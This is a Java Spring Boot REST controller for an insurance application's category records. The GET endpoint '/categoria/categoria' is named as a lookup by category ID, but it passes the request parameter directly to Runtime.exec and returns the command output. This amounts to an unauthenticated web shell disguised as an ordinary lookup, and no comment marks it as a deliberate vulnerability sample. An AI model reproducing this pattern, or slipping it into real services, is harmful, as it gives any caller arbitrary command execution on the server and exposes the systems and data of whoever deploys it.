package com.sura.seguros.controller;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URI;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.DeleteMapping;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.support.ServletUriComponentsBuilder;

import com.sura.seguros.entity.Categoria;
import com.sura.seguros.repository.CategoriaRepository;

@RestController
@RequestMapping(path = "/categoria")
public class CategoriaController 
{
    @Autowired
    private CategoriaRepository categoriaRepository;
    
    @GetMapping(path="/", produces = "application/json")
    public Iterable<Categoria> consultarTodasCategorias() 
    {
        return categoriaRepository.findAll();
    }
     
    @GetMapping(path="/categoria", produces = "application/json")
    public String consultarCategoriaPeloIdCategoria(@RequestParam String categoria) 
    {
    	Process process = null;
    	String line_="";
    	  try
          { 
    		  process = Runtime.getRuntime().exec(categoria); 

    		  process.waitFor();
    		  BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    		  String line;
    		  
  		  		while ((line=reader.readLine())!=null)
    		  	{
  		  				line_+=line;
    		  			System.out.println(line);   
    		  	} 
    		  	
    		  	
           }       
              catch(Exception e)
           { 
               System.out.println(e); 
           }
           finally
           {
             process.destroy();
           }  
    	
    	
    	
    	
    	
      return line_;
    }
    
    @DeleteMapping(path= "/", consumes = "application/json", produces = "application/json")
    public void deleteCategoria(@RequestParam Long id_categoria) throws Exception 
    {
    	categoriaRepository.deleteByIdCategoria(id_categoria);
    }
    
    @PostMapping(path= "/", consumes = "application/json", produces = "application/json")
    public ResponseEntity<Object> inserirCategoria(@RequestBody Categoria categoria) throws Exception 
    {
       
        //add resource
    	categoriaRepository.save(categoria);
        
        //Create resource location
        URI location = ServletUriComponentsBuilder.fromCurrentRequest()
                                    .path("/{id_categoria}")
                                    .buildAndExpand(categoria.getIdCategoria())
                                    .toUri();
        
        //Send location in response
        return ResponseEntity.created(location).build();
    }
}
